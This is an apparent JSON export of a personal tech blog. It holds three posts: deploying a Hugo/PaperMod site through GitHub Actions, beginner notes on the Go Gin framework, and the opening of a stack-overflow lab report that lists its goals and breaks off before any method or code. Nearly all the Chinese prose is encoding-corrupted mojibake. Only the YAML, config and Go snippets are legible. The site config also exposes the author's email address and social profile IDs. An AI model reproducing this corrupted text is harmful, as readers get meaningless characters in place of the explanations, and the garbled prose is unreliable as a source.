[{"content":"æœ€è¿‘é˜¿é‡Œäº‘æœåŠ¡å™¨åˆ°æœŸï¼ŒæœåŠ¡å¤ªè´µäº†ï¼Œæ‰€ä»¥å°±æƒ³ç€ç»§ç»­ä½¿ç”¨githubä½œä¸ºåšå®¢æ­å»ºçš„æ–¹æ³•ã€‚ä»¥å‰ä½¿ç”¨hexoä½œä¸ºé™æ€åšå®¢å·¥å…·ã€‚æœ€è¿‘äº†è§£äº†ä¸€ä¸‹hugo,å‘ç°Hugoçš„ä¸»é¢˜Hugo-PaperModæŒºå¥½çœ‹çš„ï¼Œå°±äº†è§£äº†ä¸€ä¸‹ï¼Œå¹¶ä¸”ç»“åˆgithub action å®ç°è‡ªåŠ¨åŒ–éƒ¨ç½²ã€‚å¹¶ä»ä¸­å­¦ä¹ åˆ°äº†ä¸€äº›gitçš„å‘½ä»¤ï¼Œç¨åä¹Ÿåšä¸€ä¸ªæ•´ç†ä¾¿äºåŠ æ·±å°è±¡ã€‚\nHugo-PaperMod å®‰è£…Hugo mac ç¯å¢ƒç›´æ¥brew install hugoå³å¯å®‰è£…hugo\nåˆ›å»ºç½‘ç«™ å‘½ä»¤hugo new site myblogå¯ä»¥å»ºç«‹ç«™ç‚¹\nç›®å½•å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 . â”œâ”€â”€ archetypes â”‚ â””â”€â”€ default.md // è¿™é‡Œæ˜¯æ¨¡ç‰ˆæ–‡ä»¶ â”œâ”€â”€ config.toml // è¿™é‡Œæ˜¯é…ç½®æ–‡ä»¶ â”œâ”€â”€ content // è¿™é‡Œæ˜¯æ–‡ä»¶å†…å®¹ â”œâ”€â”€ data â”œâ”€â”€ layouts â”œâ”€â”€ static â””â”€â”€ themes 6 directories, 2 files tomlé…ç½®æ–‡ä»¶ä¹Ÿå¯ä»¥æ”¹ä¸ºyamlæ ¼å¼ã€‚\né…ç½®ä¸»é¢˜ åœ¨themesä¸‹ç›´æ¥git clone git@github.com:adityatelange/hugo-PaperMod.git\nç„¶åå¯ä»¥ç¼–å†™config.yamlæ–‡ä»¶äº†ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯éœ€è¦æŠŠä¸»é¢˜æ¢ä¸ºè‡ªå·±é€‰æ‹©çš„ä¸»é¢˜:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 baseURL: http://www.reus09.top # baseURL: https://www.sulvblog.cn # ç»‘å®šçš„åŸŸå languageCode: zh-cn # en-us title: Reus09\u0026#39;s Blog theme: hugo-PaperMod # ä¸»é¢˜åå­—ï¼Œå’Œthemesæ–‡ä»¶å¤¹ä¸‹çš„ä¸€è‡´ enableInlineShortcodes: true enableEmoji: true # å…è®¸ä½¿ç”¨ Emoji è¡¨æƒ…ï¼Œå»ºè®® true enableRobotsTXT: true # å…è®¸çˆ¬è™«æŠ“å–åˆ°æœç´¢å¼•æ“ï¼Œå»ºè®® true hasCJKLanguage: true # è‡ªåŠ¨æ£€æµ‹æ˜¯å¦åŒ…å« ä¸­æ–‡æ—¥æ–‡éŸ©æ–‡ å¦‚æœæ–‡ç« ä¸­ä½¿ç”¨äº†å¾ˆå¤šä¸­æ–‡å¼•å·çš„è¯å¯ä»¥å¼€å¯ buildDrafts: false buildFuture: false buildExpired: false #googleAnalytics: UA-123-45 # è°·æ­Œç»Ÿè®¡ # Copyright: Sulv paginate: 10 # é¦–é¡µæ¯é¡µæ˜¾ç¤ºçš„æ–‡ç« æ•° minify: disableXML: true # minifyOutput: true permalinks: post: \u0026#34;/:title/\u0026#34; # post: \u0026#34;/:year/:month/:day/:title/\u0026#34; defaultContentLanguage: en # æœ€é¡¶éƒ¨é¦–å…ˆå±•ç¤ºçš„è¯­è¨€é¡µé¢ defaultContentLanguageInSubdir: true languages: en: languageName: \u0026#34;English\u0026#34; # contentDir: content/english weight: 1 profileMode: enabled: true title: (ã€ƒ\u0026#39;â–½\u0026#39;ã€ƒ) subtitle: \u0026#34;ä¿®ç‚¼æ—¥è®°\u0026#34; imageUrl: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; imageTitle: imageWidth: 150 imageHeight: 150 buttons: - name: ğŸ‘¨ğŸ»â€ğŸ’»æŠ€æœ¯ url: posts/tech - name: ğŸ“•é˜…è¯» url: posts/read - name: ğŸ–ç”Ÿæ´» url: posts/life menu: main: - identifier: search name: ğŸ”æœç´¢ url: search weight: 1 - identifier: home name: ğŸ ä¸»é¡µ url: / weight: 2 - identifier: posts name: ğŸ“šæ–‡ç«  url: posts weight: 3 # - identifier: tech # name: ğŸ‘¨ğŸ»â€ğŸ’»æŠ€æœ¯æ–‡ç«  # url: posts/tech # weight: 5 # - identifier: life # name: ğŸ–è®°å½•ç”Ÿæ´» # url: posts/life # weight: 6 - identifier: archives name: â±æ—¶é—´è½´ url: archives/ weight: 20 # - identifier: categories # name: ğŸ§©åˆ†ç±» # url: categories # weight: 30 - identifier: tags name: ğŸ”–æ ‡ç­¾ url: tags weight: 40 - identifier: about name: ğŸ™‹ğŸ»â€â™‚ï¸å…³äº url: about weight: 50 - identifier: links name: ğŸ¤å‹é“¾ url: links weight: 60 outputs: home: - HTML - RSS - JSON params: env: production # to enable google analytics, opengraph, twitter-cards and schema. # description: \u0026#34;è¿™æ˜¯ä¸€ä¸ªçº¯ç²¹çš„åšå®¢......\u0026#34; author: Reus09 # author: [\u0026#34;Me\u0026#34;, \u0026#34;You\u0026#34;] # multiple authors ShowAllPagesInArchive: true defaultTheme: auto # defaultTheme: light or dark disableThemeToggle: false DateFormat: \u0026#34;2006-01-02\u0026#34; ShowShareButtons: true ShowReadingTime: true # disableSpecialistPost: true displayFullLangName: true ShowPostNavLinks: true ShowBreadCrumbs: true ShowCodeCopyButtons: true hideFooter: false # éšè—é¡µè„š ShowWordCounts: true VisitCount: true ShowLastMod: true #æ˜¾ç¤ºæ–‡ç« æ›´æ–°æ—¶é—´ ShowToc: true # æ˜¾ç¤ºç›®å½• TocOpen: true # è‡ªåŠ¨å±•å¼€ç›®å½• comments: true socialIcons: - name: github url: \u0026#34;https://github.com/xyming108\u0026#34; - name: twitter url: \u0026#34;img/twitter.png\u0026#34; - name: facebook url: \u0026#34;https://www.facebook.com/profile.php?id=100027782410997\u0026#34; - name: instagram url: \u0026#34;img/instagram.png\u0026#34; - name: QQ url: \u0026#34;img/qq.png\u0026#34; - name: WeChat url: \u0026#34;img/wechat.png\u0026#34; # - name: Phone # url: \u0026#34;img/phone.png\u0026#34; - name: email url: \u0026#34;mailto:1931559710@qq.com\u0026#34; - name: RSS url: \u0026#34;index.xml\u0026#34; # editPost: # URL: \u0026#34;https://github.com/adityatelange/hugo-PaperMod/tree/exampleSite/content\u0026#34; # Text: \u0026#34;Suggest Changes\u0026#34; # edit text # appendFilePath: true # to append file path to Edit link # label: # text: \u0026#34;Home\u0026#34; # icon: icon.png # iconHeight: 35 # analytics: # google: # SiteVerificationTag: \u0026#34;XYZabc\u0026#34; assets: favicon: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; favicon16x16: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; favicon32x32: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; apple_touch_icon: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; safari_pinned_tab: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; # cover: # hidden: true # hide everywhere but not in structured data # hiddenInList: true # hide on list pages and home # hiddenInSingle: true # hide on single page fuseOpts: isCaseSensitive: false shouldSort: true location: 0 distance: 1000 threshold: 1 minMatchCharLength: 0 keys: [\u0026#34;title\u0026#34;, \u0026#34;permalink\u0026#34;, \u0026#34;summary\u0026#34;] twikoo: version: 1.4.11 taxonomies: category: categories tag: tags series: series markup: goldmark: renderer: unsafe: true # HUGO é»˜è®¤è½¬ä¹‰ Markdown æ–‡ä»¶ä¸­çš„ HTML ä»£ç ï¼Œå¦‚éœ€å¼€å¯çš„è¯ highlight: # anchorLineNos: true codeFences: true guessSyntax: true lineNos: true # noClasses: false # style: monokai style: darcula # codeFencesï¼šä»£ç å›´æ åŠŸèƒ½ï¼Œè¿™ä¸ªåŠŸèƒ½ä¸€èˆ¬éƒ½è¦è®¾ä¸º true çš„ï¼Œä¸ç„¶å¾ˆéš¾çœ‹ï¼Œå°±æ˜¯å¹²å·´å·´çš„-ä»£ç æ–‡å­—ï¼Œæ²¡æœ‰é¢œè‰²ã€‚ # guessSyntaxï¼šçŒœæµ‹è¯­æ³•ï¼Œè¿™ä¸ªåŠŸèƒ½å»ºè®®è®¾ç½®ä¸º true, å¦‚æœä½ æ²¡æœ‰è®¾ç½®è¦æ˜¾ç¤ºçš„è¯­è¨€åˆ™ä¼šè‡ªåŠ¨åŒ¹é…ã€‚ # hl_Linesï¼šé«˜äº®çš„è¡Œå·ï¼Œä¸€èˆ¬è¿™ä¸ªä¸è®¾ç½®ï¼Œå› ä¸ºæ¯ä¸ªä»£ç å—æˆ‘ä»¬å¯èƒ½å¸Œæœ›è®©é«˜äº®çš„åœ°æ–¹ä¸ä¸€æ ·ã€‚ # lineNoStartï¼šè¡Œå·ä»ç¼–å·å‡ å¼€å§‹ï¼Œä¸€èˆ¬ä» 1 å¼€å§‹ã€‚ # lineNosï¼šæ˜¯å¦æ˜¾ç¤ºè¡Œå·ï¼Œæˆ‘æ¯”è¾ƒå–œæ¬¢æ˜¾ç¤ºï¼Œæ‰€ä»¥æˆ‘è®¾ç½®çš„ä¸º true. # lineNumbersInTableï¼šä½¿ç”¨è¡¨æ¥æ ¼å¼åŒ–è¡Œå·å’Œä»£ç ,è€Œä¸æ˜¯ æ ‡ç­¾ã€‚è¿™ä¸ªå±æ€§ä¸€èˆ¬è®¾ç½®ä¸º true. # noClassesï¼šä½¿ç”¨ class æ ‡ç­¾ï¼Œè€Œä¸æ˜¯å†…åµŒçš„å†…è”æ ·å¼ privacy: vimeo: disabled: false simple: true twitter: disabled: false enableDNT: true simple: true instagram: disabled: false simple: true youtube: disabled: false privacyEnhanced: true services: instagram: disableInlineCSS: true twitter: disableInlineCSS: true hugo å¸¸ç”¨çš„å‘½ä»¤:\nhugo server -D æœ¬åœ°æ¼”ç¤º hugo new xxx/xxx.md è¿™é‡Œçš„xxxä¸ºcontentä¸‹é¢çš„ç›®å½•ä¸‹é¢çš„æ–‡æ¡£ hugo ç”Ÿæˆé™æ€æ–‡ä»¶ Github Action é…ç½®ä»¥åŠè”åˆåŸŸåè§£æ githubæ“ä½œ è¿™é‡Œæˆ‘ä»¬åˆ›å»ºä¸¤ä¸ªä»“åº“ï¼Œä¸€ä¸ªç§æœ‰åº“å­˜å‚¨åšå®¢æºç ï¼Œä¸€ä¸ªå…¬å¼€åº“ï¼Œå³xxxx.github.io.å­˜å‚¨æˆ‘ä»¬çš„åšå®¢é™æ€ç½‘é¡µã€‚\nè¿™é‡Œç§æœ‰åº“ : blog public : reus09.github.io é…ç½®tocken,å› ä¸ºæˆ‘ä»¬éœ€è¦ä»åšå®¢ä»“åº“æ¨é€åˆ°å¤–éƒ¨ GitHub Pages ä»“åº“ï¼Œéœ€è¦ç‰¹å®šæƒé™ï¼Œè¦åœ¨ GitHub è´¦æˆ·ä¸‹ Setting - Developer setting - Personal access tokens ä¸‹åˆ›å»ºä¸€ä¸ª Tokenã€‚éœ€è¦å¼€å¯æƒé™repoå’Œworkflow\né…ç½®åå¤åˆ¶ç”Ÿæˆçš„ Tokenï¼ˆæ³¨ï¼šåªä¼šå‡ºç°ä¸€æ¬¡ï¼‰ï¼Œç„¶ååœ¨æˆ‘ä»¬åšå®¢æºä»“åº“(blog)çš„ Settings - Secrets - Actions ä¸­æ·»åŠ  PERSONAL_TOKEN ç¯å¢ƒå˜é‡ä¸ºåˆšæ‰çš„ Tokenï¼Œè¿™æ · GitHub Action å°±å¯ä»¥è·å–åˆ° Token äº†ã€‚\né˜¿é‡Œäº‘åŸŸåè§£æ åˆ¶å®šè®°å½•ç±»å‹ä¸ºCNAME,ç„¶åä¸»æœºè®°å½•åˆ†åˆ«ä¸º@å’Œwwwï¼Œè®°å½•å€¼ä¸ºreus09.github.ioï¼Œè¿™é‡Œå°±æ˜¯ä½ çš„githubåšå®¢åœ°å€ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ping xxxx.github.io æ¥è·å–å…¶å¯¹åº”çš„çœŸå®IPåœ°å€ã€‚\ngitæ“ä½œ åœ¨hugoåˆå§‹çš„site:myblogä¸‹:\ngit init åˆå§‹åŒ–gitä»“åº“\nåœ¨myblogç›®å½•ä¸‹å»ºç«‹.github/workflows/deploy.yml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 name: deploy on: push: workflow_dispatch: schedule: # Runs everyday at 8:00 AM - cron: \u0026#34;0 0 * * *\u0026#34; jobs: build: runs-on: ubuntu-20.04 steps: - name: Checkout uses: actions/checkout@v2 with: submodules: true fetch-depth: 0 - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: \u0026#34;latest\u0026#34; - name: Build Web run: hugo - name: Deploy Web uses: peaceiris/actions-gh-pages@v3 with: # è¿™é‡Œå³ä¸º æˆ‘ä»¬ä¸Šæ–‡ä¸­ä¸º blog ç”Ÿæˆçš„secret PERSONAL_TOKEN: ${{ secrets.PERSONAL_TOKEN }} # è¿™é‡ŒæŒ‡å‘è‡ªå·±çš„githubo åšå®¢åœ°å€ EXTERNAL_REPOSITORY: reus09/reus09.github.io PUBLISH_BRANCH: master PUBLISH_DIR: ./public # æŒ‡å®š CNAME CNAME: www.reus09.top commit_message: ${{ github.event.head_commit.message }} on è¡¨ç¤º GitHub Action è§¦å‘æ¡ä»¶ï¼Œæˆ‘è®¾ç½®äº† pushã€workflow_dispatch å’Œ schedule ä¸‰ä¸ªæ¡ä»¶ï¼š\npushï¼Œå½“è¿™ä¸ªé¡¹ç›®ä»“åº“å‘ç”Ÿæ¨é€åŠ¨ä½œåï¼Œæ‰§è¡Œ GitHub Action workflow_dispatchï¼Œå¯ä»¥åœ¨ GitHub é¡¹ç›®ä»“åº“çš„ Action å·¥å…·æ è¿›è¡Œæ‰‹åŠ¨è°ƒç”¨ scheduleï¼Œå®šæ—¶æ‰§è¡Œ GitHub Actionï¼Œå¦‚æˆ‘çš„è®¾ç½®ä¸ºåŒ—äº¬æ—¶é—´æ¯å¤©æ—©ä¸Šæ‰§è¡Œï¼Œä¸»è¦æ˜¯ä½¿ç”¨ä¸€äº›è‡ªåŠ¨åŒ–ç»Ÿè®¡ CI æ¥è‡ªåŠ¨æ›´æ–°æˆ‘åšå®¢çš„å…³äºé¡µé¢ï¼Œå¦‚æœ¬å‘¨ç¼–ç æ—¶é—´ï¼Œå½±éŸ³è®°å½•ç­‰ï¼Œå¦‚æœä½ ä¸éœ€è¦å®šæ—¶åŠŸèƒ½ï¼Œå¯ä»¥åˆ é™¤è¿™ä¸ªæ¡ä»¶ jobs è¡¨ç¤º GitHub Action ä¸­çš„ä»»åŠ¡ï¼Œæˆ‘ä»¬è®¾ç½®äº†ä¸€ä¸ª build ä»»åŠ¡ï¼Œruns-on è¡¨ç¤º GitHub Action è¿è¡Œç¯å¢ƒï¼Œæˆ‘ä»¬é€‰æ‹©äº† ubuntu-latestã€‚æˆ‘ä»¬çš„ build ä»»åŠ¡åŒ…å«äº† Checkoutã€Setup Hugoã€Build Web å’Œ Deploy Web å››ä¸ªä¸»è¦æ­¥éª¤ï¼Œå…¶ä¸­ run æ˜¯æ‰§è¡Œçš„å‘½ä»¤ï¼Œuses æ˜¯ GitHub Action ä¸­çš„ä¸€ä¸ªæ’ä»¶ï¼Œæˆ‘ä»¬ä½¿ç”¨äº† peaceiris/actions-hugo@v2 å’Œ peaceiris/actions-gh-pages@v3 è¿™ä¸¤ä¸ªæ’ä»¶ã€‚å…¶ä¸­ Checkout æ­¥éª¤ä¸­ with ä¸­é…ç½® submodules å€¼ä¸º true å¯ä»¥åŒæ­¥åšå®¢æºä»“åº“çš„å­æ¨¡å—ï¼Œå³æˆ‘ä»¬çš„ä¸»é¢˜æ¨¡å—ã€‚\nç»è¿‡ä¸Šè¿°é…ç½®ï¼Œæˆ‘ä»¬å·²ç»å®ç°äº† Hugo åšå®¢æœ¬åœ°æ­å»ºåŠç‰ˆæœ¬ç®¡ç†ã€GitHub Pages éƒ¨ç½²ç½‘ç«™å‘å¸ƒï¼ŒHugp ä¸»é¢˜ç®¡ç†åŠæ›´æ–°ç­‰åŠŸèƒ½ï¼Œå®ç°äº†å®Œæ•´çš„ç³»ç»Ÿã€‚ç°åœ¨æ¯å½“æˆ‘ä»¬æœ¬åœ°é€šè¿‡ç†Ÿæ‚‰çš„ Markdown è¯­æ³•å®Œæˆåšå®¢å†…å®¹ç¼–è¾‘åï¼Œåªéœ€è¦æ¨é€ä»£ç ï¼Œç­‰å¾…å‡ åˆ†é’Ÿï¼Œå³å¯é€šè¿‡æˆ‘ä»¬çš„è‡ªå®šä¹‰åŸŸåè®¿é—®æ›´æ–°åçš„ç½‘ç«™ã€‚\n1 2 3 4 git remote add origin git@github.com:reus09/blog.git git add -A git commit -m \u0026#34;test\u0026#34; git push -u origin master -f å³å¯å®ç°è‡ªåŠ¨åŒ–ä¸Šä¼ æºç  é—®é¢˜ åœ¨ä¸Šè¿°é…ç½®å¥½ä¹‹åï¼Œpushä¹‹åå‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨checkoutæœ‰ä¸ªé—®é¢˜\nå³ä»–åœ¨.gitmodulesæ²¡æœ‰è¿™ä¸ª submodule path\näºæ˜¯æˆ‘ä»¬åœ¨myblogç›®å½•ä¸‹åŠ å…¥.gitmodules\n1 2 3 4 [submodule \u0026#34;themes/hugo-PaperMod\u0026#34;] path = themes/hugo-PaperMod url = https://github.com/adityatelange/hugo-PaperMod branch = master å‘ç°å°±å¯ä»¥è§£å†³äº† ","permalink":"http://www.reus09.top/posts/tech/hugo%E9%83%A8%E7%BD%B2github/","summary":"æœ€è¿‘é˜¿é‡Œäº‘æœåŠ¡å™¨åˆ°æœŸï¼ŒæœåŠ¡å¤ªè´µäº†ï¼Œæ‰€ä»¥å°±æƒ³ç€ç»§ç»­ä½¿ç”¨githubä½œä¸ºåšå®¢æ­å»ºçš„æ–¹æ³•ã€‚ä»¥å‰ä½¿ç”¨hexoä½œä¸ºé™æ€åšå®¢å·¥å…·ã€‚æœ€è¿‘äº†è§£äº†ä¸€ä¸‹hugo","title":"Hugoéƒ¨ç½²github"},{"content":"å¯¹å¼€æºçš„å¼€å‘æ¡†æ¶ginè¿›è¡Œäº†ç®€å•çš„å­¦ä¹ ï¼Œå¯¹å¸¸ç”¨çš„è¿›è¡Œäº†ç®€å•çš„æ•´ç†ã€‚\nåˆå§‹åŒ– è¿™é‡Œç›´æ¥ç»™å‡ºä¸€ä¸ªé€šç”¨çš„æ¨¡æ¿ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 func main(){ // ä½¿ç”¨é»˜è®¤ä¸­é—´ä»¶åˆ›å»ºä¸€ä¸ªginè·¯ç”±å™¨ // logger and recovery (crash-free) ä¸­é—´ä»¶ router := gin.Default() // åŠ è½½templatesç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä¸ºhtml router.LoadHTMLGlob(\u0026#34;/templates/**\u0026#34;) router.GET(\u0026#34;/someGet\u0026#34;, getting) router.POST(\u0026#34;/somePost\u0026#34;, posting) router.PUT(\u0026#34;/somePut\u0026#34;, putting) router.DELETE(\u0026#34;/someDelete\u0026#34;, deleting) router.PATCH(\u0026#34;/somePatch\u0026#34;, patching) router.HEAD(\u0026#34;/someHead\u0026#34;, head) router.OPTIONS(\u0026#34;/someOptions\u0026#34;, options) // Simple group: v1 v1 := router.Group(\u0026#34;/v1\u0026#34;) {\t// /v1/login v1.POST(\u0026#34;/login\u0026#34;, loginEndpoint) v1.POST(\u0026#34;/submit\u0026#34;, submitEndpoint) v1.POST(\u0026#34;/read\u0026#34;, readEndpoint) } // é»˜è®¤å¯åŠ¨çš„æ˜¯ 8080ç«¯å£ï¼Œä¹Ÿå¯ä»¥è‡ªå·±å®šä¹‰å¯åŠ¨ç«¯å£ router.Run() // router.Run(\u0026#34;:3000\u0026#34;) for a hard coded port } gin.Default()åˆå§‹äº†ä¸­é—´ä»¶ï¼Œé»˜è®¤ä¸ºloggerå’Œrecovery,ä¹Ÿå¯ä»¥é€šè¿‡gin.New()å®ç°æ— ä¸­é—´ä»¶å¯åŠ¨æœåŠ¡ åŒæ—¶ginä¹Ÿæ”¯æŒä¸ƒç§HTTPè¯·æ±‚æ–¹å¼ï¼Œæ–¹ä¾¿åç«¯ä¸šåŠ¡å¢åˆ æ”¹æŸ¥çš„è°ƒç”¨ã€‚ è·å–å‚æ•° Resté£æ ¼è·å–å‚æ•° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // æ­¤è§„åˆ™èƒ½å¤ŸåŒ¹é…/user/johnè¿™ç§æ ¼å¼ï¼Œä½†ä¸èƒ½åŒ¹é…/user/ æˆ– /userè¿™ç§æ ¼å¼ router.GET(\u0026#34;/user/:name\u0026#34;, func(c *gin.Context) { name := c.Param(\u0026#34;name\u0026#34;) c.String(http.StatusOK, \u0026#34;Hello %s\u0026#34;, name) }) // ä½†æ˜¯ï¼Œè¿™ä¸ªè§„åˆ™æ—¢èƒ½åŒ¹é…/user/john/æ ¼å¼ä¹Ÿèƒ½åŒ¹é…/user/john/sendè¿™ç§æ ¼å¼ // å¦‚æœæ²¡æœ‰å…¶ä»–è·¯ç”±å™¨åŒ¹é…/user/johnï¼Œå®ƒå°†é‡å®šå‘åˆ°/user/john/ router.GET(\u0026#34;/user/:name/*action\u0026#34;, func(c *gin.Context) { name := c.Param(\u0026#34;name\u0026#34;) action := c.Param(\u0026#34;action\u0026#34;) message := name + \u0026#34; is \u0026#34; + action c.String(http.StatusOK, message) }) å¯ä»¥é€šè¿‡:å’Œ*æ¥å®ç°restfulé£æ ¼çš„ä¼ å‚å¹¶è·å–ã€‚ å¸¸è§„è·å–å‚æ•° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // åŒ¹é…çš„urlæ ¼å¼: /welcome?firstname=Jane\u0026amp;lastname=Doe router.GET(\u0026#34;/welcome\u0026#34;, func(c *gin.Context) { firstname := c.DefaultQuery(\u0026#34;firstname\u0026#34;, \u0026#34;Guest\u0026#34;) lastname := c.Query(\u0026#34;lastname\u0026#34;) // æ˜¯ c.Request.URL.Query().Get(\u0026#34;lastname\u0026#34;) çš„ç®€å†™ c.String(http.StatusOK, \u0026#34;Hello %s %s\u0026#34;, firstname, lastname) }) // ä¼ å…¥çš„post è¯·æ±‚ router.POST(\u0026#34;/form_post\u0026#34;, func(c *gin.Context) { message := c.PostForm(\u0026#34;message\u0026#34;) nick := c.DefaultPostForm(\u0026#34;nick\u0026#34;, \u0026#34;anonymous\u0026#34;) // æ­¤æ–¹æ³•å¯ä»¥è®¾ç½®é»˜è®¤å€¼ c.JSON(200, gin.H{ \u0026#34;status\u0026#34;: \u0026#34;posted\u0026#34;, \u0026#34;message\u0026#34;: message, \u0026#34;nick\u0026#34;: nick, }) }) è·å–getè¯·æ±‚çš„å‚æ•°éœ€è¦ç”¨åˆ°æ–¹æ³•Queryï¼ŒDefaultQueryæ–¹æ³•ä¸ºæŸä¸ªå‚æ•°è®¾ç½®é»˜è®¤å€¼ï¼Œåœ¨æ²¡æœ‰ä¼ å…¥çš„æƒ…å†µä¸‹å­˜åœ¨é»˜è®¤å€¼ã€‚ è·å–POSTçš„å‚æ•°ç”¨çš„æ–¹æ³•PostFormè·å–æäº¤çš„æ•°æ®ï¼ŒDefaultPostFormåŒæ ·ä¸ºè®¾ç½®é»˜è®¤å€¼ã€‚ ä¸Šä¼ æ–‡ä»¶ ginå¯¹fileå°è£…çš„è¾ƒä¸ºå®Œå–„ï¼Œæ–‡ä»¶ä¸Šä¼ ç”¨èµ·æ¥ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ï¼Œå¯¹äºå•ä¸ªæ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡FormFileè·å–ä¼ å…¥å¯¹åº”çš„æ–‡ä»¶åå³å¯ï¼Œå¯¹äºä¸Šä¼ çš„å¤šä¸ªæ–‡ä»¶ï¼Œå°†å…¶è½¬åŒ–ä¸ºæ–‡ä»¶æ•°ç»„å³å¯ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // ç»™è¡¨å•é™åˆ¶ä¸Šä¼ å¤§å° (é»˜è®¤ 32 MiB) // router.MaxMultipartMemory = 8 \u0026lt;\u0026lt; 20 // 8 MiB router.POST(\u0026#34;/upload\u0026#34;, func(c *gin.Context) { // å•æ–‡ä»¶ file, _ := c.FormFile(\u0026#34;file\u0026#34;) log.Println(file.Filename) // å¤šæ–‡ä»¶ form, _ := c.MultipartForm() files := form.File[\u0026#34;upload[]\u0026#34;] for _, file := range files { log.Println(file.Filename) } // ä¸Šä¼ æ–‡ä»¶åˆ°æŒ‡å®šçš„è·¯å¾„ // c.SaveUploadedFile(file, dst) c.String(http.StatusOK, fmt.Sprintf(\u0026#34;\u0026#39;%s\u0026#39; uploaded!\u0026#34;, file.Filename)) }) ç›®å½•ç»“æ„è®¾è®¡ ä»ä¸Šåˆ°ä¸‹ç›®å½•ç»“æ„ä¸º:\næ–‡ä»¶ æ¦‚è¦ config é…ç½®æ–‡ä»¶å¯¹åº”çš„ç»“æ„ä½“å®šä¹‰ controller ä¸šåŠ¡å±‚ dao æ“ä½œæ•°æ®åº“,ç»™ä¸šåŠ¡controlleræä¾›æ•°æ® forms å­—æ®µéªŒè¯çš„struct global å®šä¹‰å…¨å±€å˜é‡ initialize æœåŠ¡åˆå§‹åŒ– logs æ—¥å¿—å­˜å‚¨ middlewares ä¸­é—´ä»¶ models æ•°æ®åº“å­—æ®µå®šä¹‰ Response ç»Ÿä¸€å°è£…response static èµ„æºæ–‡ä»¶å¤¹ router è·¯ç”± setting-dev.yaml é…ç½®æ–‡ä»¶ main.go æœåŠ¡å¯åŠ¨æ–‡ä»¶ ","permalink":"http://www.reus09.top/posts/tech/gin/","summary":"å¯¹å¼€æºçš„å¼€å‘æ¡†æ¶ginè¿›è¡Œäº†ç®€å•çš„å­¦ä¹ ï¼Œå¯¹å¸¸ç”¨çš„è¿›è¡Œäº†ç®€å•çš„æ•´ç†ã€‚ åˆå§‹åŒ– è¿™é‡Œç›´æ¥ç»™å‡ºä¸€ä¸ªé€šç”¨çš„æ¨¡æ¿ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21","title":"Gin"},{"content":"æ ˆæº¢å‡ºæŠ¥å‘Š 0x01 ç›®æ ‡ é€šè¿‡å¯¹ç¨‹åºè¾“å…¥çš„å¯†ç çš„é•¿åº¦ã€å†…å®¹ç­‰ä¿®æ”¹ç”¨Ollydbgæ¥éªŒè¯ç¼“å†²åŒºæº¢å‡ºçš„å‘ç”Ÿï¼ˆå‚è€ƒæä¾›çš„ä¸¤ä¸ªä»£ç ï¼‰ å®Œæˆæ·¹æ²¡ç›¸é‚»å˜é‡æ”¹å˜ç¨‹åºæµç¨‹å®éªŒ å®Œæˆæ·¹æ²¡è¿”å›åœ°å€æ”¹å˜ç¨‹åºæµç¨‹å®éªŒ é™„åŠ é¢˜ ä»¥StackOverrunç¨‹åºä¸ºé¶å­ï¼Œé€šè¿‡è‡ªå·±ä½¿ç”¨ollydbgè°ƒè¯•ï¼Œä¸¤ä¸ªè¦æ±‚ï¼šå…¶ä¸€ï¼Œè¦æ±‚åˆ†æPEæ ¼å¼åŠ è½½åˆ°å†…å­˜ä¸­çš„åœ°å€å˜åŒ–ï¼›å…¶äºŒï¼ŒæŒ‘é€‰å…¶ä¸­ä¸€å¤„å‡½æ•°çš„è·³è½¬ï¼Œè¯¦ç»†åˆ†æï¼Œè·³è½¬æ—¶spï¼Œbpï¼Œipçš„å˜åŒ–ï¼Œè¦æ±‚ä»¥ç¨‹åºè¿è¡Œçš„é¡ºåºè®°å½•è·³è½¬æ—¶çš„è¿™äº›å¯„å­˜å™¨çš„å˜åŒ–ã€‚ åœ¨æ²¡æœ‰æºä»£ç 